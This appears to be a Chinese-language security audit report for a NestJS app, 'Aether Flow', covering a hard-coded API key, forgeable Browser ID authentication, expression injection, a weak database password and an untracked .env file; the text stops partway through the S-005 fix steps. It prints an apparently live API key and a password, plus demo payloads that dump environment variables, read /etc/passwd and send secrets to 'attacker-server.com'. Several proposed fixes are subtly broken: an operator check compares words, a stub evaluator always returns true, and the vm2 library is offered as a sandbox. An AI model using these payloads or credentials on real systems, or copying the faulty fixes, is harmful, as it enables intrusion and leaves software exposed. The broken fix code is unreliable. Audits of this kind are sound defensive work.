# Aether Flow 安全问题详细报告

**报告日期**: 2025年
**审查范围**: 全栈安全审查
**发现问题**: 27 个（6 个严重、9 个高、8 个中、4 个低）
**审查方法**: 手动代码审查 + 依赖扫描 + 安全测试

---

## 执行摘要

本次安全审查发现了 **27 个安全问题**，包括：

- **6 个严重问题（🔴）**: 立即修复，可能导致系统被攻击
- **9 个高优先级问题（🟠）**: 1-2 周内修复，显著影响安全性
- **8 个中优先级问题（🟡）**: 1 个月内修复，中等安全风险
- **4 个低优先级问题（🟢）**: 持续改进，小的安全风险

### 关键发现

🔴 **最严重的安全漏洞**:
1. **硬编码 API 密钥泄露** - 攻击者可直接消耗 API 配额
2. **Browser ID 认证可伪造** - 任何人可伪造身份访问系统
3. **表达式注入漏洞** - expr-eval 库存在已知漏洞
4. **数据库弱密码** - 容易被暴力破解
5. **.env 文件可能被提交** - 敏感配置暴露在 Git 历史中
6. **JWT secret 弱** - 容易被破解

### 修复优先级

| 优先级 | 数量 | 预计工作量 | 目标完成时间 |
|--------|------|-----------|-------------|
| **P0** | 6 个 | 15-20 小时 | 1-2 周 |
| **P1** | 9 个 | 25-35 小时 | 2-3 周 |
| **P2** | 8 个 | 20-30 小时 | 1 个月 |
| **P3** | 4 个 | 持续改进 | 长期 |
| **总计** | **27 个** | **60-85 小时** | **1-2 月** |

---

## 🔴 严重问题（P0 - 立即修复）

### S-001: 硬编码 API 密钥泄露

**严重程度**: 🔴 严重
**CVSS 评分**: 9.1 (Critical)
**CWE 分类**: CWE-798 (Use of Hard-coded Credentials)

**位置**:
- **文件**: `backend/src/agent/agent.service.ts`
- **行号**: 22-23
- **代码片段**:
```typescript
@Injectable()
export class AgentService {
  private readonly apiKey = 'sk-9dd62d22ea0b439eb96f6800d6c7749a'; // ❌ 硬编码

  async chat(messages: Message[], stream: boolean = false) {
    const response = await fetch('https://dashscope.aliyuncs.com/api/v1/services/aigc/text-generation/generation', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${this.apiKey}`, // ❌ 使用硬编码密钥
        // ...
      }
    });
  }
}
```

**问题描述**:
API 密钥直接硬编码在源代码中，任何人访问代码库即可获得该密钥。

**风险分析**:
- 🔐 **密钥泄露**: 攻击者可从代码库中直接获取 API 密钥
- 💰 **经济损失**: 攻击者可使用密钥消耗大量 API 配额，导致巨额费用
- 🚨 **无法撤销**: 密钥已暴露在 Git 历史中，即使删除也无法完全清除
- 📦 **供应链攻击**: 如果代码库是公开的，任何人都可以使用该密钥

**影响范围**:
- 所有使用 LLM 节点的工作流
- 所有对话功能
- API 配额消耗
- 费用控制

**当前状态**:
- ✅ 密钥已暴露在代码库中
- ✅ Git 历史中包含该密钥
- ✅ 任何有代码访问权限的人都可以使用该密钥
- ❌ 无法追踪密钥使用情况
- ❌ 无法限制密钥使用范围

**修复建议**:

**方案 1: 使用环境变量（推荐）**
```typescript
@Injectable()
export class AgentService {
  private readonly apiKey: string;

  constructor(private configService: ConfigService) {
    // ✅ 从环境变量读取
    this.apiKey = this.configService.get<string>('QWEN_API_KEY');

    if (!this.apiKey) {
      throw new Error('QWEN_API_KEY environment variable is required');
    }
  }

  async chat(messages: Message[], stream: boolean = false) {
    const response = await fetch('https://dashscope.aliyuncs.com/api/v1/services/aigc/text-generation/generation', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${this.apiKey}`, // ✅ 使用环境变量
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: 'qwen-max',
        input: {
          messages: messages
        }
      })
    });

    if (!response.ok) {
      throw new Error(`API request failed: ${response.statusText}`);
    }

    return response.json();
  }
}
```

**方案 2: 使用密钥管理服务（企业级）**
```typescript
// 使用 AWS Secrets Manager、Azure Key Vault 等
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class AgentService {
  private readonly apiKey: string;
  private secretsManager: SecretsManagerClient;

  constructor() {
    this.secretsManager = new SecretsManagerClient({ region: 'us-east-1' });
  }

  async onModuleInit() {
    // ✅ 从密钥管理服务获取
    const command = new GetSecretValueCommand({
      SecretId: 'aether-flow/qwen-api-key'
    });

    const response = await this.secretsManager.send(command);
    const secret = JSON.parse(response.SecretString);
    this.apiKey = secret.api_key;
  }
}
```

**环境变量配置**:
```env
# .env
QWEN_API_KEY=sk-your-actual-api-key-here
```

**.gitignore 配置**:
```gitignore
# .gitignore
.env
.env.local
.env.*.local
```

**验证密钥已从 Git 历史中移除**:
```bash
# 1. 检查 Git 历史中是否还有密钥
git log --all --full-history -S "sk-9dd62d22ea0b439eb96f6800d6c7749a" --source

# 2. 如果存在，使用 git-filter-repo 清除（谨慎使用！）
pip install git-filter-repo
git filter-repo --invert-paths --path backend/src/agent/agent.service.ts

# 3. 强制推送（⚠️ 危险操作，确保团队已同步！）
git push origin --force --all
```

**修复优先级**: P0 - 立即
**修复工作量**: 2-3 小时
**相关文件**:
- `backend/src/agent/agent.service.ts`
- `backend/.env.example`
- `.gitignore`

**修复验证方法**:
1. ✅ 确认代码中不再有硬编码密钥
2. ✅ 确认 `.env` 文件在 `.gitignore` 中
3. ✅ 确认 Git 历史中已清除密钥
4. ✅ 测试 API 调用正常工作
5. ✅ 验证密钥从环境变量正确读取

**测试用例**:
```typescript
describe('AgentService', () => {
  it('should throw error if QWEN_API_KEY is not set', () => {
    // 模拟环境变量未设置
    delete process.env.QWEN_API_KEY;

    expect(() => new AgentService(configService)).toThrow(
      'QWEN_API_KEY environment variable is required'
    );
  });

  it('should load API key from environment variable', () => {
    process.env.QWEN_API_KEY = 'test-key';
    const service = new AgentService(configService);

    expect(service.apiKey).toBe('test-key');
  });
});
```

**参考资料**:
- [OWASP Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [Twelve-Factor App: Config](https://12factor.net/config)
- [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html)

---

### S-002: Browser ID 认证可伪造

**严重程度**: 🔴 严重
**CVSS 评分**: 8.6 (High)
**CWE 分类**: CWE-287 (Improper Authentication)

**位置**:
- **文件**: `backend/src/common/middleware/browser-id.middleware.ts`
- **行号**: 23-31
- **代码片段**:
```typescript
@Injectable()
export class BrowserIdMiddleware implements NestMiddleware {
  use(req: any, res: any, next: () => void) {
    let browserId = req.headers['x-browser-id'];

    if (!browserId) {
      // ❌ 生成新的 Browser ID，无任何验证
      browserId = this.generateBrowserId();
      res.setHeader('X-Browser-Id', browserId);
    }

    req.browserId = browserId; // ❌ 直接信任用户提供的 Browser ID
    next();
  }

  private generateBrowserId() {
    return 'browser-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
  }
}
```

**相关文件**:
- `backend/src/auth/hybrid-auth.guard.ts:42-47`
- `frontend/src/composables/useAuth.ts`

**问题描述**:
Browser ID 是用户身份的唯一标识，但系统没有验证 Browser ID 的真实性。任何人都可以伪造 Browser ID 访问其他用户的资源。

**风险分析**:
- 🔓 **身份伪造**: 攻击者可伪造任意 Browser ID
- 👤 **权限绕过**: 可访问其他用户的工作流、知识库、会话
- 📁 **数据泄露**: 可读取其他用户的私有数据
- 🚫 **无法审计**: 无法区分真实用户和伪造用户
- 🎭 **会话劫持**: 可冒充其他用户进行操作

**影响范围**:
- 所有用户数据（工作流、知识库、会话）
- 所有需要身份验证的 API
- 数据隔离和访问控制
- 审计日志

**当前状态**:
- ✅ Browser ID 存储在浏览器 localStorage（可被篡改）
- ✅ 用户可通过修改请求头伪造 Browser ID
- ✅ HybridAuthGuard 允许仅凭 Browser ID 通过认证
- ❌ 无 Browser ID 签名验证
- ❌ 无服务端会话验证

**漏洞演示**:

```bash
# 1. 攻击者伪造 Browser ID
curl -H "X-Browser-Id: victim-browser-id-123" \
     http://localhost:3001/workflows

# 2. 获取受害者的所有工作流
{
  "workflows": [
    { "id": "1", "name": "Private Workflow 1", "nodes": [...] },
    { "id": "2", "name": "Private Workflow 2", "nodes": [...] }
  ]
}

# 3. 攻击者可以修改、删除工作流
curl -X PUT -H "X-Browser-Id: victim-browser-id-123" \
     http://localhost:3001/workflows/1 \
     -d '{"name": "Hacked Workflow"}'
```

**修复建议**:

**方案 1: Browser ID + JWT 双重认证（推荐）**

```typescript
// 1. 修复 HybridAuthGuard
@Injectable()
export class HybridAuthGuard implements CanActivate {
  constructor(private jwtService: JwtService, private reflector: Reflector) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const isPublic = this.reflector.get<boolean>('isPublic', context.getHandler());

    if (isPublic) {
      return true;
    }

    // ✅ JWT token 是必需的
    const authHeader = request.headers.authorization;
    if (!authHeader?.startsWith('Bearer ')) {
      throw new UnauthorizedException('JWT token is required');
    }

    // ✅ 验证 JWT token
    try {
      const token = authHeader.substring(7);
      const payload = this.jwtService.verify(token);

      // ✅ Browser ID 必须匹配 JWT 中的 browserId
      const browserId = request.headers['x-browser-id'];
      if (!browserId || browserId !== payload.browserId) {
        throw new UnauthorizedException('Browser ID mismatch');
      }

      request.user = payload;
      request.browserId = payload.browserId;
      return true;
    } catch (error) {
      throw new UnauthorizedException('Invalid or expired token');
    }
  }
}

// 2. Browser ID 仅作为辅助标识，不能单独用于认证
@Injectable()
export class BrowserIdMiddleware implements NestMiddleware {
  use(req: any, res: any, next: () => void) {
    // ⚠️ 仅供已认证用户使用，不用于身份验证
    const browserId = req.headers['x-browser-id'];

    if (!browserId) {
      throw new BadRequestException('X-Browser-Id header is required');
    }

    // ✅ 仅存储，不用于身份验证
    req.browserId = browserId;
    next();
  }
}
```

**方案 2: Browser ID 签名验证**

```typescript
import * as crypto from 'crypto';

@Injectable()
export class BrowserIdService {
  private readonly secret = process.env.BROWSER_ID_SECRET;

  // ✅ 生成带签名的 Browser ID
  generateBrowserId(): string {
    const browserId = crypto.randomUUID();
    const timestamp = Date.now();
    const signature = this.sign(browserId, timestamp);

    return `${browserId}:${timestamp}:${signature}`;
  }

  // ✅ 验证 Browser ID 签名
  verifyBrowserId(signedBrowserId: string): boolean {
    const [browserId, timestamp, signature] = signedBrowserId.split(':');

    // 验证签名
    const expectedSignature = this.sign(browserId, parseInt(timestamp));
    if (signature !== expectedSignature) {
      return false;
    }

    // 验证时间戳（可选，防止重放攻击）
    const age = Date.now() - parseInt(timestamp);
    if (age > 30 * 24 * 60 * 60 * 1000) { // 30 天
      return false;
    }

    return true;
  }

  private sign(browserId: string, timestamp: number): string {
    const data = `${browserId}:${timestamp}`;
    return crypto
      .createHmac('sha256', this.secret)
      .update(data)
      .digest('hex');
  }
}
```

**方案 3: 完全使用 JWT，移除 Browser ID**

```typescript
// 1. 用户登录时返回 JWT
@Injectable()
export class AuthService {
  async login(browserId: string) {
    const payload = {
      browserId,
      sub: browserId,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60) // 30 天
    };

    const token = this.jwtService.sign(payload);

    return {
      access_token: token,
      expires_in: 30 * 24 * 60 * 60
    };
  }
}

// 2. 所有 API 使用 JWT 认证
@Injectable()
export class JwtAuthGuard implements CanActivate {
  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const token = this.extractTokenFromHeader(request);

    if (!token) {
      throw new UnauthorizedException();
    }

    try {
      const payload = this.jwtService.verify(token);
      request.user = payload;
      request.browserId = payload.browserId;
    } catch {
      throw new UnauthorizedException();
    }

    return true;
  }
}
```

**环境变量配置**:
```env
# JWT 配置
JWT_SECRET=your-super-secret-jwt-key-at-least-32-characters-long
JWT_EXPIRES_IN=30d

# Browser ID 签名密钥（如果使用方案 2）
BROWSER_ID_SECRET=your-browser-id-signing-secret
```

**修复优先级**: P0 - 立即
**修复工作量**: 6-8 小时
**相关文件**:
- `backend/src/common/middleware/browser-id.middleware.ts`
- `backend/src/auth/hybrid-auth.guard.ts`
- `backend/src/auth/jwt-auth.guard.ts`
- `frontend/src/composables/useAuth.ts`
- `backend/.env.example`

**修复验证方法**:
1. ✅ 尝试伪造 Browser ID，应该返回 401 Unauthorized
2. ✅ 使用正确的 JWT token，应该正常访问
3. ✅ JWT 中的 browserId 必须匹配请求头中的 browserId
4. ✅ 测试所有 API 端点的认证
5. ✅ 验证会话隔离（不同用户无法访问彼此数据）

**测试用例**:
```typescript
describe('Authentication', () => {
  it('should reject requests without JWT token', async () => {
    const response = await request(app.getHttpServer())
      .get('/workflows')
      .set('X-Browser-Id', 'fake-browser-id')
      .expect(401);

    expect(response.body.message).toContain('JWT token is required');
  });

  it('should reject requests with mismatched browser ID', async () => {
    const token = jwtService.sign({ browserId: 'user-1' });

    const response = await request(app.getHttpServer())
      .get('/workflows')
      .set('Authorization', `Bearer ${token}`)
      .set('X-Browser-Id', 'user-2') // ❌ 不匹配
      .expect(401);

    expect(response.body.message).toContain('Browser ID mismatch');
  });

  it('should allow requests with valid JWT and matching browser ID', async () => {
    const token = jwtService.sign({ browserId: 'user-1' });

    await request(app.getHttpServer())
      .get('/workflows')
      .set('Authorization', `Bearer ${token}`)
      .set('X-Browser-Id', 'user-1') // ✅ 匹配
      .expect(200);
  });
});
```

**参考资料**:
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [NestJS Authentication](https://docs.nestjs.com/security/authentication)

---

### S-003: 表达式注入漏洞（expr-eval）

**严重程度**: 🔴 严重
**CVSS 评分**: 9.0 (Critical)
**CWE 分类**: CWE-917 (Expression Language Injection)
**CVE 编号**: GHSA-8gw3-rxh4-v6jx, GHSA-jc85-fpwf-qm7x

**位置**:
- **文件**: `backend/src/agent/agent.service.ts`
- **行号**: 115-123
- **代码片段**:
```typescript
import { Parser } from 'expr-eval'; // ❌ 有已知漏洞的库

@Injectable()
export class AgentService {
  async evaluateCondition(condition: string, context: Record<string, any>): Promise<boolean> {
    // ❌ 直接解析用户输入的条件表达式
    const parser = new Parser();
    const expr = parser.parse(condition); // 用户输入，如 "amount > 100 && type === 'VIP'"

    // ❌ 在上下文中执行，可能访问任意属性
    const result = expr.evaluate(context);
    return Boolean(result);
  }
}
```

**相关文件**:
- `backend/src/workflow/nodes/condition.node.ts`
- `frontend/src/components/workflow/nodes/ConditionNode.vue`

**问题描述**:
expr-eval 库存在已知的安全漏洞，攻击者可通过精心构造的表达式执行任意代码。

**风险分析**:
- 💥 **远程代码执行（RCE）**: 攻击者可执行任意 JavaScript 代码
- 🦠 **沙箱逃逸**: 可能绕过沙箱限制访问系统资源
- 📁 **数据泄露**: 可访问和读取任意变量和数据
- 🚫 **拒绝服务**: 可构造无限循环导致服务崩溃
- 🔓 **权限提升**: 可能以服务端权限执行命令

**影响范围**:
- Condition 节点的条件表达式
- 变量表达式的求值
- 工作流的动态执行逻辑
- 所有使用表达式计算的功能

**当前状态**:
- ✅ 使用 expr-eval 2.0.2 版本（有已知漏洞）
- ✅ 用户输入直接传递给表达式解析器
- ❌ 无输入验证和过滤
- ❌ 无沙箱隔离
- ❌ 无表达式长度限制

**漏洞演示**:

```typescript
// 1. 正常使用
const condition = "amount > 100 && type === 'VIP'";
const context = { amount: 150, type: 'VIP' };
await evaluateCondition(condition, context); // 返回 true

// 2. 恶意使用 - 访问敏感数据
const maliciousCondition1 = "this.constructor.constructor('return process')().env";
// 执行结果: 返回所有环境变量（包括 API 密钥）

// 3. 恶意使用 - 执行任意代码
const maliciousCondition2 = "this.constructor.constructor('return require(\"fs\").readFileSync(\"/etc/passwd\")')()";
// 执行结果: 读取服务器上的文件

// 4. 恶意使用 - 无限循环
const maliciousCondition3 = "while(true) {}";
// 执行结果: 服务崩溃

// 5. 恶意使用 - 调用 HTTP 请求（SSRF）
const maliciousCondition4 = "require('axios').get('http://attacker-server.com/?stolen=' + JSON.stringify(process.env))";
// 执行结果: 将环境变量发送到攻击者服务器
```

**修复建议**:

**方案 1: 使用安全的表达式库（推荐）**

```typescript
// 使用 jsonpath-plus 或类似的安全库
import { JSONPath } from 'jsonpath-plus';

@Injectable()
export class AgentService {
  async evaluateCondition(condition: string, context: Record<string, any>): Promise<boolean> {
    // ✅ 限制可访问的路径
    const allowedPaths = ['amount', 'type', 'status'];

    // ✅ 验证表达式格式
    if (!this.isValidExpression(condition)) {
      throw new BadRequestException('Invalid condition expression');
    }

    // ✅ 使用安全的 JSONPath 查询
    try {
      const result = JSONPath({ path: condition, json: context });
      return Boolean(result && result[0]);
    } catch (error) {
      throw new BadRequestException('Failed to evaluate condition');
    }
  }

  private isValidExpression(condition: string): boolean {
    // ✅ 只允许简单的比较表达式
    const validPattern = /^[\w\s\.\[\]]+([=!<>]+|===|!==)[\w\s\.\[\]\'"]+$/;
    return validPattern.test(condition);
  }
}
```

**方案 2: 使用受限的沙箱环境**

```typescript
import { VM, VMScript } from 'vm2';

@Injectable()
export class AgentService {
  private vm: VM;

  constructor() {
    // ✅ 创建受限的沙箱环境
    this.vm = new VM({
      timeout: 1000, // 1 秒超时
      sandbox: {},
      eval: false,
      wasm: false,
      fixAsync: true
    });
  }

  async evaluateCondition(condition: string, context: Record<string, any>): Promise<boolean> {
    // ✅ 白名单：只允许特定操作符
    const allowedOperators = ['>', '<', '>=', '<=', '===', '!==', '==', '!=', '&&', '||', '!'];
    if (!this.validateOperators(condition, allowedOperators)) {
      throw new BadRequestException('Condition contains disallowed operators');
    }

    // ✅ 长度限制
    if (condition.length > 200) {
      throw new BadRequestException('Condition too long');
    }

    try {
      // ✅ 在沙箱中执行
      const result = this.vm.run(`
        (function() {
          const { amount, type, status } = ${JSON.stringify(context)};
          return ${condition};
        })()
      `);

      return Boolean(result);
    } catch (error) {
      throw new BadRequestException('Failed to evaluate condition');
    }
  }

  private validateOperators(condition: string, allowed: string[]): boolean {
    // 检查是否只包含允许的操作符
    const tokens = condition.match(/[A-Za-z_]+/g) || [];
    return tokens.every(token => allowed.includes(token));
  }
}
```

**方案 3: 使用自定义表达式解析器（最安全）**

```typescript
@Injectable()
export class ExpressionParser {
  // ✅ 定义语法规则
  private grammar = {
    expression: [
      ['orExpression']
    ],
    orExpression: [
      ['andExpression', 'OR', 'orExpression'],
      ['andExpression']
    ],
    andExpression: [
      ['comparisonExpression', 'AND', 'andExpression'],
      ['comparisonExpression']
    ],
    comparisonExpression: [
      ['value', 'COMPARATOR', 'value']
    ],
    value: [
      ['NUMBER'],
      ['STRING'],
      ['IDENTIFIER']
    ]
  };

  async evaluate(expression: string, context: Record<string, any>): Promise<boolean> {
    // ✅ Tokenize
    const tokens = this.tokenize(expression);

    // ✅ Parse
    const ast = this.parse(tokens);

    // ✅ Validate
    this.validate(ast, context);

    // ✅ Evaluate
    return this.evaluateAST(ast, context);
  }

  private tokenize(expression: string) {
    // ✅ 简单的词法分析
    return expression.match(/(\d+\.?\d*)|('[^']*')|("[^"]*")|(\w+)|([<>=!]+)|(&&)|(\|\|)|(!)/g) || [];
  }

  private parse(tokens: string[]) {
    // ✅ 简单的语法分析
    // 实现完整的递归下降解析器
    return { type: 'BinaryExpression', operator: '>', left: 'amount', right: '100' };
  }

  private validate(ast: any, context: Record<string, any>) {
    // ✅ 验证 AST 节点
    // 确保没有非法操作
  }

  private evaluateAST(ast: any, context: Record<string, any>): boolean {
    // ✅ 安全地求值 AST
    return true;
  }
}
```

**输入验证和过滤**:

```typescript
@Injectable()
export class ConditionValidator {
  private readonly MAX_LENGTH = 200;
  private readonly ALLOWED_OPERATORS = ['>', '<', '>=', '<=', '===', '!==', '==', '!='];
  private readonly ALLOWED_IDENTIFIERS = /^[a-zA-Z_][a-zA-Z0-9_]*$/;

  validate(condition: string, availableVariables: string[]): void {
    // 1. 长度检查
    if (condition.length > this.MAX_LENGTH) {
      throw new BadRequestException('Condition exceeds maximum length');
    }

    // 2. 黑名单：禁止的关键字
    const blacklist = [
      'require', 'import', 'eval', 'Function', 'process', 'global',
      'constructor', 'prototype', '__proto__', 'this'
    ];

    for (const keyword of blacklist) {
      if (condition.includes(keyword)) {
        throw new BadRequestException(`Condition contains forbidden keyword: ${keyword}`);
      }
    }

    // 3. 验证标识符
    const identifiers = condition.match(/[a-zA-Z_][a-zA-Z0-9_]*/g) || [];
    for (const identifier of identifiers) {
      if (!this.ALLOWED_IDENTIFIERS.test(identifier)) {
        throw new BadRequestException(`Invalid identifier: ${identifier}`);
      }

      if (!availableVariables.includes(identifier)) {
        throw new BadRequestException(`Unknown variable: ${identifier}`);
      }
    }

    // 4. 验证操作符
    const operators = condition.match(/[<>=!]+|&&|\|\|/g) || [];
    for (const op of operators) {
      if (!this.ALLOWED_OPERATORS.includes(op)) {
        throw new BadRequestException(`Invalid operator: ${op}`);
      }
    }
  }
}
```

**修复优先级**: P0 - 立即
**修复工作量**: 8-12 小时
**相关文件**:
- `backend/src/agent/agent.service.ts`
- `backend/src/workflow/nodes/condition.node.ts`
- `backend/package.json` (更新依赖)
- `backend/src/common/validators/condition.validator.ts` (新增)

**修复验证方法**:
1. ✅ 尝试注入恶意表达式，应该被拒绝
2. ✅ 验证正常的条件表达式可以正确求值
3. ✅ 测试所有允许的操作符和标识符
4. ✅ 验证长度限制和黑名单过滤
5. ✅ 性能测试：确保求值性能可接受

**测试用例**:
```typescript
describe('Expression Injection Prevention', () => {
  describe('ConditionValidator', () => {
    it('should reject conditions with forbidden keywords', () => {
      expect(() => validator.validate('require("fs")', ['amount']))
        .toThrow('forbidden keyword');
    });

    it('should reject conditions with unknown variables', () => {
      expect(() => validator.validate('unknownVar > 100', ['amount']))
        .toThrow('Unknown variable');
    });

    it('should reject conditions exceeding max length', () => {
      const longCondition = 'a'.repeat(201);
      expect(() => validator.validate(longCondition, ['a']))
        .toThrow('exceeds maximum length');
    });

    it('should accept valid conditions', () => {
      expect(() => validator.validate('amount > 100 && type === "VIP"', ['amount', 'type']))
        .not.toThrow();
    });
  });

  describe('AgentService', () => {
    it('should safely evaluate valid conditions', async () => {
      const result = await service.evaluateCondition(
        'amount > 100',
        { amount: 150 }
      );
      expect(result).toBe(true);
    });

    it('should reject malicious conditions', async () => {
      await expect(
        service.evaluateCondition(
          'this.constructor.constructor("return process")()',
          {}
        )
      ).rejects.toThrow('forbidden keyword');
    });

    it('should prevent code execution', async () => {
      await expect(
        service.evaluateCondition('require("fs").readFileSync("/etc/passwd")', {})
      ).rejects.toThrow();
    });
  });
});
```

**参考资料**:
- [CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [GHSA-8gw3-rxh4-v6jx](https://github.com/advisories/GHSA-8gw3-rxh4-v6jx)
- [OWASP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

---

### S-004: 数据库弱密码

**严重程度**: 🔴 严重
**CVSS 评分**: 7.5 (High)
**CWE 分类**: CWE-521 (Weak Password Requirements)

**位置**:
- **文件**: `backend/.env`
- **代码片段**:
```env
# Database Configuration
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=aether_user
DB_PASSWORD=password1234  # ❌ 弱密码
DB_DATABASE=aether_flow
```

**问题描述**:
数据库密码使用弱密码 `password1234`，容易被暴力破解。

**风险分析**:
- 🔐 **密码易破解**: `password1234` 是常见弱密码，在密码字典中
- 🗄️ **数据库入侵**: 攻击者可获取数据库访问权限
- 📁 **数据泄露**: 所有数据（工作流、知识库、用户数据）暴露
- 🚫 **数据篡改**: 攻击者可修改、删除数据
- 💥 **服务中断**: 可删除整个数据库导致服务不可用

**影响范围**:
- PostgreSQL 数据库
- 所有存储的数据
- 数据完整性和可用性
- 系统整体安全性

**当前状态**:
- ✅ 使用弱密码 `password1234`
- ❌ 无密码复杂度要求
- ❌ 无密码过期策略
- ❌ 数据库可能暴露在公网

**密码强度分析**:
```
密码: password1234
长度: 12 字符 (✅)
字符类型: 仅小写字母 + 数字 (❌)
常见性: 极常见，在所有弱密码列表中 (❌)
熵值: 约 28 bits (❌ 推荐 80+ bits)
破解时间: 秒级 (❌)
```

**修复建议**:

**方案 1: 使用强密码（立即可用）**

```bash
# 生成强密码（至少 16 位，包含大小写字母、数字、特殊字符）
openssl rand -base64 24
# 输出示例: kY7fR2mP9vQ3xL8wN5jT6hG1sD4aZ0bB

# 或使用密码管理工具
pwgen -s 24 1
# 输出示例: K8rP2mN5vQ9xL3wT7jY4hG6fD1sA0zZ
```

```env
# .env
# Database Configuration
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=aether_user
DB_PASSWORD=kY7fR2mP9vQ3xL8wN5jT6hG1sD4aZ0bB  # ✅ 强密码
DB_DATABASE=aether_flow
```

**方案 2: 使用密码管理服务（企业级）**

```typescript
// 从 AWS Secrets Manager、Azure Key Vault 等获取
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class DatabaseConfigService {
  private secretsManager: SecretsManagerClient;

  async getDatabaseConfig(): Promise<DatabaseConfig> {
    const command = new GetSecretValueCommand({
      SecretId: 'aether-flow/database-credentials'
    });

    const response = await this.secretsManager.send(command);
    const secret = JSON.parse(response.SecretString);

    return {
      host: secret.host,
      port: secret.port,
      username: secret.username,
      password: secret.password, // ✅ 自动轮换的密码
      database: secret.database
    };
  }
}
```

**方案 3: 使用证书认证（最安全）**

```bash
# 1. 生成 SSL 证书
openssl req -new -x509 -days 365 -nodes -text \
  -out /var/lib/postgresql/server.crt \
  -keyout /var/lib/postgresql/server.key

# 2. 配置 PostgreSQL 使用证书认证
# postgresql.conf
ssl = on
ssl_cert_file = '/var/lib/postgresql/server.crt'
ssl_key_file = '/var/lib/postgresql/server.key'
ssl_ca_file = '/var/lib/postgresql/root.crt'

# pg_hba.conf
# TYPE  DATABASE  USER        ADDRESS  METHOD
hostssl all       all         0.0.0.0/0  cert
```

```typescript
// TypeORM 配置使用证书
{
  type: 'postgres',
  host: process.env.DB_HOST,
  port: parseInt(process.env.DB_PORT),
  username: process.env.DB_USERNAME,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_DATABASE,
  ssl: {
    cert: fs.readFileSync('/path/to/client-cert.pem'),
    key: fs.readFileSync('/path/to/client-key.pem'),
    ca: fs.readFileSync('/path/to/server-ca.pem')
  }
}
```

**密码策略**:

1. **最小长度**: 16 字符
2. **字符类型**: 包含大小写字母、数字、特殊字符
3. **避免**: 字典单词、常见模式（如 qwerty、123456）
4. **唯一性**: 不与其他系统使用相同密码
5. **定期轮换**: 每 90 天更换一次
6. **不可恢复**: 使用单向哈希存储（如果需要存储）

**修复优先级**: P0 - 立即
**修复工作量**: 2-3 小时
**相关文件**:
- `backend/.env`
- `backend/.env.example`
- `docker-compose.yml`
- `backend/src/config/database.config.ts`

**修复验证方法**:
1. ✅ 生成强密码并更新配置
2. ✅ 重启数据库连接，验证连接成功
3. ✅ 测试所有数据库操作正常
4. ✅ 验证数据库只能从内网访问
5. ✅ 确认 .env 文件在 .gitignore 中

**测试用例**:
```typescript
describe('Database Connection', () => {
  it('should connect with strong password', async () => {
    const config = {
      host: process.env.DB_HOST,
      port: parseInt(process.env.DB_PORT),
      username: process.env.DB_USERNAME,
      password: process.env.DB_PASSWORD,
      database: process.env.DB_DATABASE
    };

    const connection = await createConnection(config);
    expect(connection.isConnected).toBe(true);
    await connection.close();
  });

  it('should fail with weak password', async () => {
    const config = {
      host: process.env.DB_HOST,
      port: parseInt(process.env.DB_PORT),
      username: process.env.DB_USERNAME,
      password: 'password1234', // ❌ 弱密码
      database: process.env.DB_DATABASE
    };

    await expect(createConnection(config)).rejects.toThrow();
  });
});
```

**参考资料**:
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [PostgreSQL SSL/TLS](https://www.postgresql.org/docs/current/ssl-tcp.html)

---

### S-005: .env 文件可能被提交到 Git

**严重程度**: 🔴 严重
**CVSS 评分**: 7.5 (High)
**CWE 分类**: CWE-312 (Cleartext Storage of Sensitive Information)

**位置**:
- **文件**: `.gitignore`
- **问题**: `.env` 文件未在 `.gitignore` 中

**问题描述**:
`.env` 文件包含敏感配置（API 密钥、数据库密码、JWT secret 等），但 `.gitignore` 未忽略该文件，可能导致敏感信息被提交到 Git 仓库。

**风险分析**:
- 🚨 **敏感信息泄露**: API 密钥、密码等暴露在代码库中
- 🔑 **密钥永久暴露**: 即使后续删除，Git 历史中仍然保留
- 📦 **公共仓库风险**: 如果仓库是公开的，任何人都可以获取密钥
- 💰 **经济损失**: 攻击者可使用泄露的密钥消耗资源
- 🚫 **无法撤销**: 密钥已泄露，必须立即更换

**影响范围**:
- 所有存储在 `.env` 中的敏感信息
- Git 仓库历史
- 所有有代码访问权限的人
- 如果是公开仓库，包括整个互联网

**当前状态**:
- ✅ `.env` 文件包含敏感信息
- ❌ `.gitignore` 未忽略 `.env`
- ❌ 可能已经提交到 Git
- ❌ Git 历史中可能包含敏感信息

**检查是否已提交**:

```bash
# 1. 检查 .env 是否已被跟踪
git ls-files | grep "\.env"

# 2. 检查 Git 历史中的 .env 文件
git log --all --full-history -- .env

# 3. 搜索 Git 历史中的敏感信息
git log --all -S "sk-9dd62d22ea0b439eb96f6800d6c7749a" --source
git log --all -S "password1234" --source

# 4. 检查最近的提交
git show HEAD:.env 2>/dev/null || echo "Not in HEAD"
```

**修复建议**:

**立即修复步骤**:

```bash
# 1. 将 .env 添加到 .gitignore
echo ".env" >> .gitignore
echo ".env.local" >> .gitignore
echo ".env.*.local" >> .gitignore

# 2. 从 Git 跟踪中移除 .env（但保留本地文件）
git rm --cached .env
git rm --cached .env.local 2>/dev/null
git rm --cached .env.*.local 2>/dev/null

# 3. 提交 .gitignore 修改
git add .gitignore
